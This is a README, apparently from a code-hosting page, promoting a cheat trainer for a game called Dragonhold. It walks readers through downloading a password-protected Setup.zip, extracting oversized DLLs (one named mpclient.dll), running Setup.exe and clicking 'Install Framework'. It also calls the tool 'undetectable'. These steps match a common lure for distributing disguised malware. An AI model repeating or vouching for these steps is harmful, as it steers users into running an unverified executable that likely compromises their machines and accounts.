## 🔥 Project Overview

**This tool** is a comprehensive trainer for **Dragonhold**. This trainer provides optional gameplay assistance for solo Dragonhold sessions. It can protect the player during on-foot and dragon combat, improve stamina management, increase damage output, and reduce the risk of losing rewards during dangerous extraction missions.

**Target Audience:** Players who want a more forgiving solo experience, faster combat, easier exploration, or convenient testing of Dragonhold's dragon-riding, extraction, crafting, and castle-building systems.

> **⚠️ IMPORTANT:** This tool is for **educational and private use only**. It does not modify any game files — all changes are temporary and reset when the game closes. The tool is **undetectable**, but **use it at your own risk**. Always back up your save files before use.

## 📦 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the official download link.

### Step 2: Extract with Password

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|
|-- Setup.exe <- Main executable (699 KB)
|-- core.dll <- Core framework (115 MB)
|-- lib.dll <- Library (32 MB)
|-- mpclient.dll <- Client module (7 MB)
|-- config.ini <- Configuration file (966 KB)
|-- checksum.md5 <- Checksum verification (1 MB)
|-- Password 2026.txt <- Password reminder (empty file)
```

### Step 4: Launch the Tool

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The launcher window will appear.

### Step 5: Install Framework

1. In the launcher window, click **"Install Framework"**.
2. Wait for the confirmation message *"Framework successfully installed"*.

### Step 6: Launch the Game

1. Launch the game through the Setup launcher (click **"Play"**) or via the standard shortcut.
2. In-game, press the configured hotkey to open the main control menu.

## 📖 Detailed Feature Guide

### Movement & Exploration

Activate movement assistance only after gaining control of the character or dragon. Use moderate speed values while navigating narrow terrain, dungeons, or crowded battlefields to avoid clipping and unstable movement.

### Tools & Inventory

Complete a mission normally before using protection-related options. Return to the island and allow the game to finish its extraction and inventory-save process before changing equipment, crafting gear, or upgrading the town.

### World & Environment

Dragonhold centers on mission-based excursions into Azarkeen, where players gather loot and materials before extracting to their island. Use health, stamina, and movement options to explore dangerous areas, forgotten dungeons, and enemy-held regions with less risk.

### Combat & Weapons

Combat takes place both on foot and while riding dragons. Enable defensive options before engaging elite enemies or bosses, and use damage features selectively when you want to preserve the game's normal progression and encounter design.
